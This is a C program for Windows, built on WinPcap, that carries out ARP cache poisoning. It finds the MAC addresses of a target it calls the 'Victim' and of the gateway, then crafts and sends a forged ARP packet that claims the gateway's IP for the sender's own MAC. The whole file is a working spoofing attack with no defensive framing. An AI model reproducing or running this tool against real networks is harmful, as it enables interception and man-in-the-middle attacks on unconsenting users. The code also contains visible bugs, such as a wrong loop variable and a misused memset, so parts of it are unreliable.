#include <stdio.h>
#include <pcap.h>
#include <WinSock2.h>
#include <IPHlpApi.h>

#pragma comment (lib, "ws2_32.lib")  
#pragma comment (lib, "Iphlpapi.lib")
#pragma warning(disable:4996)

void usage(char *pname)
{
	printf("Usage: %s [options] ip-address\n", pname);
	printf("\t -h \t\thelp\n");
	printf("\t -l length \tMAC physical address length to set\n");
	printf("\t -s src-ip \tsource IP address\n");
	exit(1);
}

int main(int argc, char **argv)
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);

	IPAddr DestIp = 0;
	IPAddr SrcIp = 0;       /* default for src ip */
	ULONG MacAddr[2];       /* for 6-byte hardware addresses */
	ULONG PhysAddrLen = 6;  /* default to length of six bytes */

	/*pcap*/
	pcap_if_t *alldevs, *d;
	pcap_t *fp;
	u_int inum, j = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[100];
	long ip;

	char *DestIpString = NULL;
	char *SrcIpString = NULL;

	BYTE *bPhysAddr;
	unsigned int i;
	
	if (argc > 1) {
		for (i = 1; i < (unsigned int)argc; i++) {
			if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
				switch (tolower(argv[i][1])) {
				case 'l':
					PhysAddrLen = (ULONG)atol(argv[++i]);
					break;
				case 's':
					SrcIpString = argv[++i];
					SrcIp = inet_addr(SrcIpString);
					break;
				case 'h':
				default:
					usage(argv[0]);
					break;
				}               /* end switch */
			}
			else
				DestIpString = argv[i];
		}                       /* end for */
	}
	else
		usage(argv[0]);

	if (DestIpString == NULL || DestIpString[0] == '\0')
		usage(argv[0]);

	printf("\nNo adapter selected: printing the device list:\n");
	/* The user didn't provide a packet source: Retrieve the local device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s\n    ", ++j, d->name);

		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");

		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i< inum - 1; d = d->next, i++);

	/* Open the adapter */
	if ((fp = pcap_open_live(d->name,		// name of the device
		65536,			// portion of the packet to capture. It doesn't matter in this case 
		1,				// promiscuous mode (nonzero means promiscuous)
		1000,			// read timeout
		errbuf			// error buffer
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", argv[1]);
		return 2;
	}

	//////////////////////////////////////////////////////////////
	DestIp = inet_addr(DestIpString);

	pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}
	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		
		//while (pAdapter) {
		while (strcmp(pAdapter->IpAddressList.IpAddress.String, "0.0.0.0") == 0 || strcmp(pAdapter->GatewayList.IpAddress.String, "0.0.0.0") == 0)
			pAdapter = pAdapter->Next;

		printf("My Mac Address :\t");
		for (i = 0; i < pAdapter->AddressLength; i++) {
			if (i == (pAdapter->AddressLength - 1))
				printf("%.2X\n", (int)pAdapter->Address[i]);
			else
				printf("%.2X-", (int)pAdapter->Address[i]);
		}
		printf("My IP Address: \t%s\n",
			pAdapter->IpAddressList.IpAddress.String);
		printf("My Gateway: \t%s\n", pAdapter->GatewayList.IpAddress.String);
		printf("\t***\n");
		memset(&MacAddr, (ULONG)pAdapter->Address, pAdapter->AddressLength);

		dwRetVal = SendARP(DestIp, SrcIp, &MacAddr, &PhysAddrLen);
		
		if (dwRetVal == NO_ERROR) {
			bPhysAddr = (BYTE *)& MacAddr;

			/* set mac Destination to 1:1:1:1:1:1 */
			memcpy(&packet[0], &bPhysAddr[0], 6);
			

			if (PhysAddrLen) {
				printf("Victim's Mac Address :\t");
				for (i = 0; i < (int)PhysAddrLen; i++) {
					if (i == (PhysAddrLen - 1))
						printf("%.2X\n", (int)bPhysAddr[i]);
					else
						printf("%.2X-", (int)bPhysAddr[i]);
				}
				printf("\t***\n");
			}
			else
				printf
				("Warning: SendArp completed successfully, but returned length=0\n");
		}
		else {
			printf("Error: SendArp failed with error: %d", dwRetVal);
			switch (dwRetVal) {
			case ERROR_GEN_FAILURE:
				printf(" (ERROR_GEN_FAILURE)\n");
				break;
			case ERROR_INVALID_PARAMETER:
				printf(" (ERROR_INVALID_PARAMETER)\n");
				break;
			case ERROR_INVALID_USER_BUFFER:
				printf(" (ERROR_INVALID_USER_BUFFER)\n");
				break;
			case ERROR_BAD_NET_NAME:
				printf(" (ERROR_GEN_FAILURE)\n");
				break;
			case ERROR_BUFFER_OVERFLOW:
				printf(" (ERROR_BUFFER_OVERFLOW)\n");
				break;
			case ERROR_NOT_FOUND:
				printf(" (ERROR_NOT_FOUND)\n");
				break;
			default:
				printf("\n");
				break;
			}
		}
				
		DestIp = inet_addr(pAdapter->GatewayList.IpAddress.String);
		dwRetVal = SendARP(DestIp, SrcIp, &MacAddr, &PhysAddrLen);

		if (dwRetVal == NO_ERROR) {
			bPhysAddr = (BYTE *)& MacAddr;

			/* set mac Source to 2:2:2:2:2:2 */
			memcpy(&packet[6], &pAdapter->Address[0], 6);

			if (PhysAddrLen) {
				printf("GW's Mac Address :\t");
				for (i = 0; i < (int)PhysAddrLen; i++) {
					if (i == (PhysAddrLen - 1))
						printf("%.2X\n", (int)bPhysAddr[i]);
					else
						printf("%.2X-", (int)bPhysAddr[i]);
				}
				printf("\t***\n");
			}
			else
				printf
				("Warning: SendArp completed successfully, but returned length=0\n");
		}
		else {
			printf("Error: SendArp failed with error: %d", dwRetVal);
			switch (dwRetVal) {
			case ERROR_GEN_FAILURE:
				printf(" (ERROR_GEN_FAILURE)\n");
				break;
			case ERROR_INVALID_PARAMETER:
				printf(" (ERROR_INVALID_PARAMETER)\n");
				break;
			case ERROR_INVALID_USER_BUFFER:
				printf(" (ERROR_INVALID_USER_BUFFER)\n");
				break;
			case ERROR_BAD_NET_NAME:
				printf(" (ERROR_GEN_FAILURE)\n");
				break;
			case ERROR_BUFFER_OVERFLOW:
				printf(" (ERROR_BUFFER_OVERFLOW)\n");
				break;
			case ERROR_NOT_FOUND:
				printf(" (ERROR_NOT_FOUND)\n");
				break;
			default:
				printf("\n");
				break;
			}
		}		
		/* Fill the rest of the packet */
		for (i = 12; i<100; i++)
		{
			packet[i] = 0x00;
		}
		// arp type
		packet[12] = 0x08;
		packet[13] = 0x06;
		// hw type
		packet[15] = 0x01;
		// protocol type
		packet[16] = 0x08;
		// hw size
		packet[18] = 0x06;
		// protocol size		
		packet[19] = 0x04;		
		// opcode
		packet[21] = 0x01;
		memcpy(&packet[22], &pAdapter->Address[0], 6);
		SrcIp = inet_addr(pAdapter->GatewayList.IpAddress.String);
		memcpy(&packet[28], &SrcIp, 4);

		DestIp = inet_addr(DestIpString);
		memcpy(&packet[38], &DestIp, 4);
		

		/* Send down the packet */
		if (pcap_sendpacket(fp,	// Adapter
			packet,				// buffer with the packet
			100					// size
		) != 0)
		{
			fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
			return 3;
		}

		pcap_close(fp);
	}
	else {
		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);

	}
	if (pAdapterInfo)
		free(pAdapterInfo);

	return 0;
}